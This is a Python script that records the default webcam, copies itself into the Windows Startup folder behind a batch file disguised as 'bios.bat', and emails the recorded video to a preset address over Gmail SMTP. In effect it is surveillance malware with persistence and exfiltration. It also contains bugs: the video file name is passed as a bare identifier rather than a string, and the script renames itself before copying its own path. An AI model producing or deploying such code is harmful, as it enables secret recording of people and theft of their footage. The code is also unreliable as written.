import cv2
import smtplib
import os
import shutil
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

# Email configuration
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
EMAIL_ADDRESS = 'your_email@gmail.com'  # Replace with your email
EMAIL_PASSWORD = 'your_app_password'  # Replace with your App Password
RECIPIENT_EMAIL = 'recipient_email@gmail.com'  # Replace with the recipient's email address

# Function to send email with the video attachment
def send_email(video_path):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = 'Webcam Video'

    with open(video_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(video_path)}')
        msg.attach(part)

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)

# Rename The Script
os.rename(__file__, 'WebcamLogger.py')

# Function to create the batch file in the startup folder
def create_startup_batch():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    batch_file_path = os.path.join(startup_folder, 'bios.bat')

    with open(batch_file_path, 'w') as f:
        f.write('@echo off\n')
        f.write(f'python "{os.path.join(startup_folder, "WebcamLogger.py")}"\n')

    # Copy this script to the startup folder as WebcamLogger.py
    shutil.copy(sys.argv[0], os.path.join(startup_folder, 'WebcamLogger.py'))

# Initialize the webcam
cap = cv2.VideoCapture(0)  # 0 is usually the default camera

# Check if the webcam is opened correctly
if not cap.isOpened():
    exit()

# Get the width and height of the frame
frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

# Define the codec and create VideoWriter object
output_filename = 'Webcam_Log.avi'
fourcc = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter(output_filename, fourcc, 20.0, (frame_width, frame_height))

# Create the batch file in the startup folder
create_startup_batch()

try:
    while True:
        ret, frame = cap.read()
        if not ret:
            break

        out.write(frame)
        cv2.imshow('Webcam', frame)

        # Break the loop on 'q' key press
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
finally:
    cap.release()
    out.release()
    cv2.destroyAllWindows()

    # Send the recorded video via email
    send_email(Webcam_Log.avi)

    # Clean up: remove the output video file if you don't want to keep it after emailing
    os.remove(Webcam_Log.avi)
